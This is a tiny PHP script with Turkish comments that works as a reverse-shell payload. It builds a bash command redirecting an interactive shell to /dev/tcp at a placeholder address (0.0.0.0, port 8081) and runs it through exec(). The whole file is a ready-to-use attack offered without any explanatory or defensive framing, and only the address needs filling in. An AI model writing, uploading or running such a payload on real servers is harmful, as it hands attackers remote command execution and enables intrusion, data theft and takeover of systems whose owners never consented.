<?php
$ip = '0.0.0.0';
$port = 8081;

$shell = "/bin/bash";

// Sunucu üzerinde çalışacak olan komut
$cmd = "$shell -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";

// Komutu çalıştır
exec($cmd);
?>
